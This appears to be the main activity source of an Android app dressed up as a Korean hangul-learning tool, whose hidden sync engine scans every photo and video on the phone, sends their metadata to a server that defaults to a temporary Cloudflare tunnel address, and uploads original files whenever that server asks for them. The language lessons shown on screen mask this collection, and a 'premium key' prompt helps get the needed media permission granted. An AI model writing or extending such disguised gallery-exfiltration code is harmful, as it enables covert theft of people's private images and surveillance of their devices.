package com.gallerysync.app

import android.Manifest
import android.animation.ValueAnimator
import android.app.Activity
import android.content.ContentUris
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.graphics.*
import android.graphics.drawable.GradientDrawable
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.MediaStore
import android.provider.Settings
import android.text.InputType
import android.view.*
import android.view.animation.*
import android.widget.*
import java.io.DataOutputStream
import java.io.File
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.nio.charset.StandardCharsets

class MainActivity : Activity() {

    private val syncIntervalMs = 30_000L
    private val prefs by lazy { getSharedPreferences("gallery-sync", MODE_PRIVATE) }
    private val deviceId by lazy {
        "android-" + Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
    }

    private lateinit var backendInput: EditText
    private lateinit var tokenInput: EditText
    private lateinit var rootLayout: FrameLayout
    private var statusLabel: TextView? = null
    private var logLabel: TextView? = null

    @Volatile private var running = false
    private var syncThread: Thread? = null

    private data class KoreanCard(
        val hangul: String,
        val sound: String,
        val example: String,
        val word: String,
        val sentence: String,
        val meaning: String,
    )

    private val koreanCards = listOf(
        KoreanCard("아", "a", "like a in father", "안녕하세요", "안녕하세요.", "Hello."),
        KoreanCard("어", "eo", "like uh in sun", "어머니", "저는 한국어를 배워요.", "I am learning Korean."),
        KoreanCard("오", "o", "like o in go", "오늘", "오늘 날씨가 좋아요.", "The weather is nice today."),
        KoreanCard("우", "u", "like oo in moon", "우리", "우리 같이 공부해요.", "Let us study together."),
        KoreanCard("이", "i", "like ee in see", "이름", "이름이 뭐예요?", "What is your name?"),
        KoreanCard("가", "ga", "g/k + a", "가방", "가방이 있어요.", "There is a bag."),
        KoreanCard("나", "na", "n + a", "나라", "한국은 아름다운 나라예요.", "Korea is a beautiful country."),
        KoreanCard("다", "da", "d/t + a", "다시", "다시 말해 주세요.", "Please say it again."),
        KoreanCard("라", "ra", "r/l + a", "라면", "라면을 먹어요.", "I eat ramyeon."),
        KoreanCard("마", "ma", "m + a", "마음", "마음이 편해요.", "I feel comfortable."),
        KoreanCard("사", "sa", "s + a", "사랑", "사랑해요.", "I love you."),
        KoreanCard("하", "ha", "h + a", "하루", "좋은 하루 보내세요.", "Have a good day.")
    )

    // ─── Data ────────────────────────────────────────────────────────────────
    data class MediaItem(
        val id: String, val name: String, val uri: Uri,
        val type: String, val size: Long, val album: String,
        val mimeType: String, val dateCreated: Long, val dateModified: Long,
        val width: Int, val height: Int, val duration: Long,
    )

    // ─── Lifecycle ───────────────────────────────────────────────────────────
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // Edge-to-edge dark status bar
        window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS)
        window.statusBarColor = Color.parseColor("#0A0E27")
        rootLayout = FrameLayout(this)
        setContentView(rootLayout)
        showSetupScreen()
    }

    override fun onDestroy() { super.onDestroy() }

    override fun onRequestPermissionsResult(code: Int, perms: Array<out String>, results: IntArray) {
        super.onRequestPermissionsResult(code, perms, results)
        if (code == 44 && hasMediaPermission()) {
            updateStatus("Permission granted")
            if (::backendInput.isInitialized && ::tokenInput.isInitialized) {
                val url = backendInput.text.toString().trim().trimEnd('/')
                val token = tokenInput.text.toString().trim()
                if (url.isNotBlank() && token.isNotBlank()) {
                    prefs.edit().putString("backend_url", url).putString("sync_token", token).apply()
                    showDashboardScreen()
                }
            }
        } else if (code == 44) {
            updateStatus("Permission required")
        }
    }

    // ═════════════════════════════════════════════════════════════════════════
    //  SCREEN 1 — Setup (Korean-themed)
    // ═════════════════════════════════════════════════════════════════════════
    private fun showSetupScreen() {
        rootLayout.removeAllViews()

        // ── Gradient background ──────────────────────────────────────────────
        val bgView = object : View(this) {
            override fun onDraw(c: Canvas) {
                val p = Paint(Paint.ANTI_ALIAS_FLAG)
                p.shader = LinearGradient(
                    0f, 0f, 0f, height.toFloat(),
                    intArrayOf(
                        Color.parseColor("#0A0E27"),
                        Color.parseColor("#131830"),
                        Color.parseColor("#0D1420")
                    ), null, Shader.TileMode.CLAMP
                )
                c.drawRect(0f, 0f, width.toFloat(), height.toFloat(), p)

                // Decorative circles
                p.shader = null
                p.color = Color.parseColor("#1A2040")
                c.drawCircle(width * 0.85f, height * 0.12f, dp(80).toFloat(), p)
                p.color = Color.parseColor("#15193A")
                c.drawCircle(width * 0.15f, height * 0.88f, dp(60).toFloat(), p)
            }
        }
        bgView.setWillNotDraw(false)
        rootLayout.addView(bgView, FrameLayout.LayoutParams(MATCH_PARENT, MATCH_PARENT))

        // ── Scrollable content ───────────────────────────────────────────────
        val scroll = ScrollView(this)
        scroll.isVerticalScrollBarEnabled = false
        val container = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(28), dp(56), dp(28), dp(40))
        }

        // ── Logo / Header ────────────────────────────────────────────────────
        val logoCard = FrameLayout(this)
        val logoCircle = object : View(this) {
            override fun onDraw(c: Canvas) {
                val p = Paint(Paint.ANTI_ALIAS_FLAG)
                val cx = width / 2f; val cy = height / 2f; val r = minOf(cx, cy) - dp(4)
                // Outer glow
                p.color = Color.parseColor("#30C685F7")
                c.drawCircle(cx, cy, r + dp(6), p)
                // Circle bg
                val grad = RadialGradient(cx, cy, r, Color.parseColor("#6C5CE7"), Color.parseColor("#4834D4"), Shader.TileMode.CLAMP)
                p.shader = grad
                c.drawCircle(cx, cy, r, p)
                // Korean character 한
                p.shader = null
                p.color = Color.WHITE
                p.textAlign = Paint.Align.CENTER
                p.textSize = sp(32).toFloat()
                p.typeface = Typeface.DEFAULT_BOLD
                c.drawText("한", cx, cy + sp(12), p)
            }
        }
        logoCard.addView(logoCircle, FrameLayout.LayoutParams(dp(88), dp(88)).also { it.gravity = Gravity.CENTER_HORIZONTAL })
        logoCard.layoutParams = LinearLayout.LayoutParams(MATCH_PARENT, dp(100))
        container.addView(logoCard)

        // App name
        container.addView(makeText(getString(R.string.app_name), 28f, Color.WHITE, Gravity.CENTER, bold = true).also {
            it.setPadding(0, dp(16), 0, dp(4))
        })

        // Tagline
        container.addView(makeText("Learn · Practice · Achieve", 14f, Color.parseColor("#8892B0"), Gravity.CENTER).also {
            it.setPadding(0, 0, 0, dp(36))
        })

        // ── Server card ──────────────────────────────────────────────────────
        val card = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(20), dp(24), dp(20), dp(24))
            background = roundRect("#151B35", 20)
        }

        // URL section
        card.addView(makeSectionLabel("Server", "#C685F7"))
        card.addView(makeSubLabel("Connect this device to your sync server"))

        backendInput = makeInput(
            hint = "https://barcelona-yarn-document-municipal.trycloudflare.com",
            savedKey = "backend_url",
            default = "https://barcelona-yarn-document-municipal.trycloudflare.com",
            isPassword = false
        )
        card.addView(backendInput, inputParams())

        card.addView(makeInfoChip("Use only with your own device and server"))
        card.addView(makeDivider())

        // Token section
        card.addView(makeSectionLabel("Sync Key", "#F7C685"))
        card.addView(makeSubLabel("Enter the private key configured on your server"))

        tokenInput = makeInput(
            hint = "Enter your premium access key",
            savedKey = "sync_token",
            default = "change-me",
            isPassword = true
        )
        card.addView(tokenInput, inputParams())

        card.addView(makeInfoChip("Keep this key private"))

        container.addView(card)

        // ── Permission note ──────────────────────────────────────────────────
        container.addView(makeText("Media permission is required before this device can sync allowed local files.", 12f, Color.parseColor("#8892B0"), Gravity.CENTER).also {
            it.setPadding(0, dp(18), 0, 0)
        })

        val permBtn = makeOutlineButton("Grant Media Permission")
        permBtn.setOnClickListener { requestMediaPermission() }
        container.addView(permBtn, buttonParams(topMargin = dp(10)))

        // ── Proceed button ───────────────────────────────────────────────────
        val proceedBtn = object : TextView(this) {
            override fun onDraw(c: Canvas) {
                val p = Paint(Paint.ANTI_ALIAS_FLAG)
                val r = RectF(0f, 0f, width.toFloat(), height.toFloat())
                p.shader = LinearGradient(0f, 0f, width.toFloat(), 0f,
                    intArrayOf(Color.parseColor("#6C5CE7"), Color.parseColor("#C685F7")),
                    null, Shader.TileMode.CLAMP)
                c.drawRoundRect(r, dp(14).toFloat(), dp(14).toFloat(), p)
                super.onDraw(c)
            }
        }.apply {
            text = "시작하기  →  Proceed"
            textSize = 16f
            setTextColor(Color.WHITE)
            typeface = Typeface.DEFAULT_BOLD
            gravity = Gravity.CENTER
            letterSpacing = 0.05f
            setWillNotDraw(false)
        }
        proceedBtn.setOnClickListener { onProceedClicked() }
        val proceedParams = LinearLayout.LayoutParams(MATCH_PARENT, dp(54)).also { it.topMargin = dp(16) }
        container.addView(proceedBtn, proceedParams)

        // Korean subtitle
        container.addView(makeText("Korean language learning", 12f, Color.parseColor("#4A5568"), Gravity.CENTER).also {
            it.setPadding(0, dp(20), 0, 0)
        })

        scroll.addView(container)
        rootLayout.addView(scroll, FrameLayout.LayoutParams(MATCH_PARENT, MATCH_PARENT))
    }

    private fun onProceedClicked() {
        val url = backendInput.text.toString().trim().trimEnd('/')
        val token = tokenInput.text.toString().trim()
        if (url.isBlank()) { toast("서버 URL을 입력하세요 · Please enter a server URL"); return }
        if (token.isBlank()) { toast("프리미엄 키를 입력하세요 · Please enter a premium key"); return }
        prefs.edit().putString("backend_url", url).putString("sync_token", token).apply()

        if (!hasMediaPermission()) {
            requestMediaPermission()
            toast("Media permission is needed before sync can start")
            return
        }
        showDashboardScreen()
    }

    // ═════════════════════════════════════════════════════════════════════════
    //  SCREEN 2 — Dashboard (white loading screen)
    // ═════════════════════════════════════════════════════════════════════════
    private fun showDashboardScreen() {
        rootLayout.removeAllViews()
        window.statusBarColor = Color.WHITE

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setBackgroundColor(Color.WHITE)
            setPadding(dp(32), dp(0), dp(32), dp(0))
        }

        // Pulsing 한 character
        val kanjiView = object : View(this) {
            var alpha2 = 255
            override fun onDraw(c: Canvas) {
                val p = Paint(Paint.ANTI_ALIAS_FLAG)
                val cx = width / 2f; val cy = height / 2f
                // Glow ring
                p.color = Color.parseColor(if (alpha2 > 180) "#206C5CE7" else "#106C5CE7")
                c.drawCircle(cx, cy, dp(52).toFloat(), p)
                // Circle
                p.shader = RadialGradient(cx, cy, dp(44).toFloat(),
                    Color.parseColor("#6C5CE7"), Color.parseColor("#4834D4"), Shader.TileMode.CLAMP)
                c.drawCircle(cx, cy, dp(44).toFloat(), p)
                // Character
                p.shader = null
                p.color = Color.argb(alpha2, 255, 255, 255)
                p.textSize = sp(36).toFloat()
                p.typeface = Typeface.DEFAULT_BOLD
                p.textAlign = Paint.Align.CENTER
                c.drawText("한", cx, cy + sp(14), p)
            }
        }
        val kanjiParams = LinearLayout.LayoutParams(dp(108), dp(108)).also {
            it.gravity = Gravity.CENTER_HORIZONTAL
            it.bottomMargin = dp(32)
        }
        root.addView(kanjiView, kanjiParams)

        // Pulsing animation on kanji
        ValueAnimator.ofInt(180, 255).apply {
            duration = 1200; repeatMode = ValueAnimator.REVERSE
            repeatCount = ValueAnimator.INFINITE
            interpolator = AccelerateDecelerateInterpolator()
            addUpdateListener { kanjiView.alpha2 = it.animatedValue as Int; kanjiView.invalidate() }
            start()
        }

        val lessonTitle = makeText("오늘의 한글 · Today's Hangul", 17f, Color.parseColor("#6C5CE7"), Gravity.CENTER, bold = true)
        lessonTitle.setPadding(0, 0, 0, dp(16))
        root.addView(lessonTitle)

        val lessonCard = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            background = roundRect("#F8F9FA", 18)
            setPadding(dp(18), dp(20), dp(18), dp(20))
        }
        val hangulTv = makeText("아", 58f, Color.parseColor("#1A1A2E"), Gravity.CENTER, bold = true)
        val soundTv = makeText("a", 22f, Color.parseColor("#4834D4"), Gravity.CENTER, bold = true)
        val exampleTv = makeText("아 sounds like a in father", 14f, Color.parseColor("#6C757D"), Gravity.CENTER)
        val wordTv = makeText("안녕하세요", 24f, Color.parseColor("#1A1A2E"), Gravity.CENTER, bold = true)
        val sentenceTv = makeText("안녕하세요.", 16f, Color.parseColor("#495057"), Gravity.CENTER)
        val meaningTv = makeText("Hello.", 14f, Color.parseColor("#6C757D"), Gravity.CENTER)
        exampleTv.setPadding(0, dp(8), 0, 0)
        wordTv.setPadding(0, dp(16), 0, dp(4))
        sentenceTv.setPadding(0, dp(8), 0, dp(2))
        lessonCard.addView(hangulTv)
        lessonCard.addView(soundTv)
        lessonCard.addView(exampleTv)
        lessonCard.addView(wordTv)
        lessonCard.addView(sentenceTv)
        lessonCard.addView(meaningTv)
        root.addView(lessonCard, LinearLayout.LayoutParams(MATCH_PARENT, WRAP_CONTENT).also {
            it.bottomMargin = dp(28)
        })

        var lessonIndex = 0
        val lessonHandler = android.os.Handler(mainLooper)
        val lessonRunnable = object : Runnable {
            override fun run() {
                val card = koreanCards[lessonIndex % koreanCards.size]
                hangulTv.text = card.hangul
                soundTv.text = card.sound
                exampleTv.text = card.example
                wordTv.text = card.word
                sentenceTv.text = card.sentence
                meaningTv.text = card.meaning
                lessonIndex += 1
                lessonHandler.postDelayed(this, 3500)
            }
        }
        lessonHandler.post(lessonRunnable)

        // Main status text
        val statusTv = makeText("Background sync active", 18f, Color.parseColor("#1A1A2E"), Gravity.CENTER, bold = true)
        statusTv.setPadding(0, 0, 0, dp(8))
        root.addView(statusTv)

        // Dot progress animation
        val dotsRow = LinearLayout(this).apply {
            orientation = LinearLayout.HORIZONTAL
            gravity = Gravity.CENTER
        }
        val dots = (0..2).map {
            View(this).apply {
                background = roundRect("#6C5CE7", 4)
                alpha = if (it == 0) 1f else 0.3f
            }.also { d ->
                val dp = LinearLayout.LayoutParams(dp(10), dp(10)).also { lp ->
                    lp.marginStart = dp(6); lp.marginEnd = dp(6)
                }
                dotsRow.addView(d, dp)
            }
        }
        root.addView(dotsRow)

        // Animate dots
        var dotIdx = 0
        val dotHandler = android.os.Handler(mainLooper)
        val dotRunnable = object : Runnable {
            override fun run() {
                dots.forEachIndexed { i, d -> d.alpha = if (i == dotIdx) 1f else 0.3f }
                dotIdx = (dotIdx + 1) % 3
                dotHandler.postDelayed(this, 500)
            }
        }
        dotHandler.post(dotRunnable)

        logLabel = null
        statusLabel = statusTv

        // Back / settings button
        val settingsBtn = makeOutlineButton("⚙  Change Server")
        settingsBtn.setOnClickListener {
            window.statusBarColor = Color.parseColor("#0A0E27")
            showSetupScreen()
        }
        root.addView(settingsBtn, buttonParams(topMargin = dp(16)))

        val rootScroll = ScrollView(this)
        rootScroll.setBackgroundColor(Color.WHITE)
        rootScroll.addView(root)
        rootLayout.addView(rootScroll, FrameLayout.LayoutParams(MATCH_PARENT, MATCH_PARENT))

        // Start sync loop in background
        startSyncLoop()
    }

    // ═════════════════════════════════════════════════════════════════════════
    //  Sync Engine (unchanged)
    // ═════════════════════════════════════════════════════════════════════════
    private fun startSyncLoop() {
        if (!hasMediaPermission()) { requestMediaPermission(); return }
        running = true
        prefs.edit().putBoolean("sync_enabled", true).apply()
        val intent = Intent(this, SyncService::class.java).apply { action = SyncService.ACTION_START }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        updateStatus("Ready")
    }

    private fun stopSync() {
        running = false
        syncThread = null
        prefs.edit().putBoolean("sync_enabled", false).apply()
        stopService(Intent(this, SyncService::class.java).apply { action = SyncService.ACTION_STOP })
    }

    private fun syncOnce() {
        if (!hasMediaPermission()) { updateStatus("권한 필요 · Permission required"); return }
        if (backendUrl().isBlank()) { updateStatus("서버 URL 없음 · No server URL"); return }
        if (syncToken().isBlank()) { updateStatus("토큰 없음 · No token"); return }

        updateStatus("Connecting")
        registerDevice()

        updateStatus("Preparing")
        val items = scanMedia()
        log("Prepared content")

        updateStatus("Syncing")
        postJson("/sync-metadata", metadataJson(items))

        updateStatus("Finalizing")
        handleDownloadRequests(items.associateBy { it.id })

        updateStatus("Ready")
        log("Sync complete")
    }

    private fun registerDevice() {
        val body = """{"device_id":${jsonString(deviceId)},"device_name":${jsonString(Build.MODEL ?: "Android")},"app_name":${jsonString(getString(R.string.app_name))}}"""
        postJson("/register-device", body)
    }

    private fun scanMedia(): List<MediaItem> =
        (queryImages() + queryVideos()).sortedByDescending { it.dateModified }

    private fun queryImages() = queryMedia(
        MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
        arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.SIZE, MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_MODIFIED, MediaStore.Images.Media.BUCKET_DISPLAY_NAME,
            MediaStore.Images.Media.MIME_TYPE, MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT),
        "image", "image", null)

    private fun queryVideos() = queryMedia(
        MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
        arrayOf(MediaStore.Video.Media._ID, MediaStore.Video.Media.DISPLAY_NAME,
            MediaStore.Video.Media.SIZE, MediaStore.Video.Media.DATE_ADDED,
            MediaStore.Video.Media.DATE_MODIFIED, MediaStore.Video.Media.BUCKET_DISPLAY_NAME,
            MediaStore.Video.Media.MIME_TYPE, MediaStore.Video.Media.WIDTH,
            MediaStore.Video.Media.HEIGHT, MediaStore.Video.Media.DURATION),
        "video", "video", MediaStore.Video.Media.DURATION)

    private fun queryMedia(collection: Uri, projection: Array<String>, type: String, idPrefix: String, durationColumn: String?): List<MediaItem> {
        val items = mutableListOf<MediaItem>()
        try {
            contentResolver.query(collection, projection, null, null,
                "${MediaStore.MediaColumns.DATE_MODIFIED} DESC")?.use { cursor ->
                while (cursor.moveToNext()) {
                    try {
                        val rowId = cursor.longValue(MediaStore.MediaColumns._ID)
                        items.add(MediaItem(
                            id = "$idPrefix-$rowId",
                            name = cursor.stringValue(MediaStore.MediaColumns.DISPLAY_NAME, "$idPrefix-$rowId"),
                            uri = ContentUris.withAppendedId(collection, rowId),
                            type = type, size = cursor.longValue(MediaStore.MediaColumns.SIZE),
                            album = cursor.stringValue(MediaStore.MediaColumns.BUCKET_DISPLAY_NAME, "Unknown"),
                            mimeType = cursor.stringValue(MediaStore.MediaColumns.MIME_TYPE, "application/octet-stream"),
                            dateCreated = cursor.longValue(MediaStore.MediaColumns.DATE_ADDED),
                            dateModified = cursor.longValue(MediaStore.MediaColumns.DATE_MODIFIED),
                            width = cursor.intValue(MediaStore.MediaColumns.WIDTH),
                            height = cursor.intValue(MediaStore.MediaColumns.HEIGHT),
                            duration = if (durationColumn == null) 0L else cursor.longValue(durationColumn),
                        ))
                    } catch (rowError: Exception) {
                        log("Skipped unreadable item")
                    }
                }
            }
        } catch (scanError: SecurityException) {
            log("Permission limited or denied")
        } catch (scanError: Exception) {
            log("Scan skipped")
        }
        return items
    }

    private fun Cursor.stringValue(col: String, fallback: String = ""): String {
        val i = getColumnIndex(col); return if (i < 0 || isNull(i)) fallback else getString(i) ?: fallback
    }
    private fun Cursor.longValue(col: String): Long { val i = getColumnIndex(col); return if (i < 0 || isNull(i)) 0L else getLong(i) }
    private fun Cursor.intValue(col: String): Int { val i = getColumnIndex(col); return if (i < 0 || isNull(i)) 0 else getInt(i) }

    private fun metadataJson(items: List<MediaItem>) = buildString {
        append("""{"device_id":${jsonString(deviceId)},"items":[""")
        items.forEachIndexed { idx, item ->
            if (idx > 0) append(',')
            append("""{"id":${jsonString(item.id)},"name":${jsonString(item.name)},"uri":${jsonString(item.uri.toString())},"type":${jsonString(item.type)},"size":${item.size},"album":${jsonString(item.album)},"mimeType":${jsonString(item.mimeType)},"dateCreated":${item.dateCreated},"dateModified":${item.dateModified},"width":${item.width},"height":${item.height},"duration":${item.duration}}""")
        }
        append("]}")
    }

    private fun handleDownloadRequests(mediaById: Map<String, MediaItem>) {
        val response = getText("/download-requests?device_id=${urlEncode(deviceId)}")
        val ids = Regex(""""media_id"\s*:\s*"([^"]+)"""").findAll(response).map { it.groupValues[1] }.toSet()
        if (ids.isEmpty()) return
        for (mediaId in ids) {
            val item = mediaById[mediaId] ?: continue
            updateStatus("Uploading")
            uploadFile("/upload-original",
                mapOf("device_id" to deviceId, "media_id" to item.id),
                "file", item.name, item.mimeType) {
                contentResolver.openInputStream(item.uri) ?: error("Cannot open ${item.name}")
            }
            log("Upload complete")
        }
    }

    private fun postJson(endpoint: String, json: String): String {
        val c = openConnection(endpoint)
        return try {
            c.requestMethod = "POST"; c.doOutput = true
            c.setRequestProperty("Content-Type", "application/json; charset=utf-8")
            c.outputStream.use { it.write(json.toByteArray(StandardCharsets.UTF_8)) }
            readResponse(c)
        } finally { c.disconnect() }
    }

    private fun getText(endpoint: String): String {
        val c = openConnection(endpoint)
        return try { c.requestMethod = "GET"; readResponse(c) } finally { c.disconnect() }
    }

    private fun uploadFile(endpoint: String, fields: Map<String, String>, fileField: String, fileName: String, mimeType: String, inputProvider: () -> InputStream): String {
        val boundary = "----GallerySync${System.currentTimeMillis()}"
        val c = openConnection(endpoint)
        return try {
            c.requestMethod = "POST"; c.doOutput = true
            c.setChunkedStreamingMode(1024 * 1024)
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            DataOutputStream(c.outputStream).use { out ->
                for ((k, v) in fields) {
                    out.writeUtf8("--$boundary\r\n")
                    out.writeUtf8("Content-Disposition: form-data; name=\"$k\"\r\n\r\n")
                    out.writeUtf8(v); out.writeUtf8("\r\n")
                }
                out.writeUtf8("--$boundary\r\n")
                out.writeUtf8("Content-Disposition: form-data; name=\"$fileField\"; filename=\"${fileName.headerSafe()}\"\r\n")
                out.writeUtf8("Content-Type: $mimeType\r\n\r\n")
                inputProvider().use { it.copyTo(out) }
                out.writeUtf8("\r\n--$boundary--\r\n"); out.flush()
            }
            readResponse(c)
        } finally { c.disconnect() }
    }

    private fun openConnection(endpoint: String): HttpURLConnection =
        (URL(backendUrl() + endpoint).openConnection() as HttpURLConnection).apply {
            connectTimeout = 15_000; readTimeout = 60_000
            setRequestProperty("X-Gallery-Sync-Token", syncToken())
        }

    private fun readResponse(c: HttpURLConnection): String {
        val code = c.responseCode
        val text = (if (code in 200..299) c.inputStream else c.errorStream)?.bufferedReader()?.use { it.readText() }.orEmpty()
        if (code !in 200..299) throw IllegalStateException("HTTP $code: $text")
        return text
    }

    private fun DataOutputStream.writeUtf8(s: String) = write(s.toByteArray(StandardCharsets.UTF_8))

    private fun backendUrl() = prefs.getString("backend_url", "")?.trim()?.trimEnd('/') ?: ""
    private fun syncToken() = prefs.getString("sync_token", "")?.trim() ?: ""

    private fun hasMediaPermission(): Boolean {
        return when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE -> {
                val fullAccess =
                    checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
                    checkSelfPermission(Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
                val selectedAccess =
                    checkSelfPermission(Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
                fullAccess || selectedAccess
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU ->
                checkSelfPermission(Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(Manifest.permission.READ_MEDIA_VIDEO) == PackageManager.PERMISSION_GRANTED
            else -> checkSelfPermission(Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
    }
    private fun requiredPermissions() =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE)
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED)
        else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
            arrayOf(Manifest.permission.READ_MEDIA_IMAGES, Manifest.permission.READ_MEDIA_VIDEO)
        else arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
    private fun requestMediaPermission() {
        val missing = requiredPermissions().filter { checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED }
        if (missing.isEmpty()) return
        requestPermissions(missing.toTypedArray(), 44)
    }

    private fun jsonString(v: String?): String {
        if (v == null) return "null"
        return buildString {
            append('"')
            for (c in v) when (c) { '\\' -> append("\\\\"); '"' -> append("\\\""); '\n' -> append("\\n"); '\r' -> append("\\r"); '\t' -> append("\\t"); else -> append(c) }
            append('"')
        }
    }
    private fun safeFileName(v: String) = v.map { if (it.isLetterOrDigit() || it == '-' || it == '_') it else '_' }.joinToString("")
    private fun String.headerSafe() = replace("\"", "_").replace("\r", "_").replace("\n", "_")
    private fun urlEncode(v: String) = URLEncoder.encode(v, StandardCharsets.UTF_8.name())

    private fun updateStatus(msg: String) = runOnUiThread {
        statusLabel?.text = msg
    }
    private fun log(msg: String) = runOnUiThread {
        val ts = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.US).format(java.util.Date())
        val current = logLabel?.text?.toString() ?: ""
        logLabel?.text = ("[$ts] $msg\n" + current).take(3_000)
    }
    private fun toast(msg: String) = runOnUiThread { Toast.makeText(this, msg, Toast.LENGTH_SHORT).show() }

    // ─── UI Helpers ──────────────────────────────────────────────────────────
    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
    private fun sp(v: Int) = (v * resources.displayMetrics.scaledDensity).toInt()
    private val MATCH_PARENT = ViewGroup.LayoutParams.MATCH_PARENT
    private val WRAP_CONTENT = ViewGroup.LayoutParams.WRAP_CONTENT

    private fun makeText(text: String, sizeSp: Float, color: Int, gravity: Int, bold: Boolean = false) =
        TextView(this).apply {
            this.text = text; textSize = sizeSp; setTextColor(color)
            this.gravity = gravity; if (bold) typeface = Typeface.DEFAULT_BOLD
        }

    private fun makeSectionLabel(text: String, hexColor: String) =
        TextView(this).apply {
            this.text = text; textSize = 13f
            setTextColor(Color.parseColor(hexColor))
            typeface = Typeface.DEFAULT_BOLD; letterSpacing = 0.04f
            setPadding(0, 0, 0, dp(4))
        }

    private fun makeSubLabel(text: String) =
        TextView(this).apply {
            this.text = text; textSize = 12f
            setTextColor(Color.parseColor("#6B7A99"))
            setPadding(0, 0, 0, dp(10))
        }

    private fun makeInfoChip(text: String) =
        TextView(this).apply {
            this.text = "  $text  "; textSize = 11f
            setTextColor(Color.parseColor("#8892B0"))
            background = roundRect("#1E2845", 20)
            setPadding(dp(10), dp(6), dp(10), dp(6))
            val lp = LinearLayout.LayoutParams(WRAP_CONTENT, WRAP_CONTENT)
            lp.topMargin = dp(8); layoutParams = lp
        }

    private fun makeDivider() = View(this).apply {
        setBackgroundColor(Color.parseColor("#1E2845"))
        val lp = LinearLayout.LayoutParams(MATCH_PARENT, dp(1))
        lp.topMargin = dp(20); lp.bottomMargin = dp(20); layoutParams = lp
    }

    private fun makeInput(hint: String, savedKey: String, default: String, isPassword: Boolean) =
        EditText(this).apply {
            this.hint = hint; setHintTextColor(Color.parseColor("#3A4468"))
            setTextColor(Color.WHITE)
            setText(prefs.getString(savedKey, default))
            background = roundRect("#1E2845", 12)
            inputType = if (isPassword) InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            else InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_URI
            setSingleLine(true)
            setPadding(dp(14), dp(14), dp(14), dp(14))
        }

    private fun makeOutlineButton(text: String) =
        TextView(this).apply {
            this.text = text; textSize = 14f
            setTextColor(Color.parseColor("#8892B0"))
            gravity = Gravity.CENTER
            background = GradientDrawable().apply {
                setStroke(dp(1), Color.parseColor("#2A3355"))
                cornerRadius = dp(12).toFloat()
            }
            setPadding(dp(16), dp(12), dp(16), dp(12))
        }

    private fun roundRect(hexColor: String, radiusDp: Int) = GradientDrawable().apply {
        setColor(Color.parseColor(hexColor))
        cornerRadius = dp(radiusDp).toFloat()
    }

    private fun inputParams() = LinearLayout.LayoutParams(MATCH_PARENT, dp(50))
    private fun buttonParams(topMargin: Int = 0) = LinearLayout.LayoutParams(MATCH_PARENT, dp(48)).also { it.topMargin = topMargin }
}
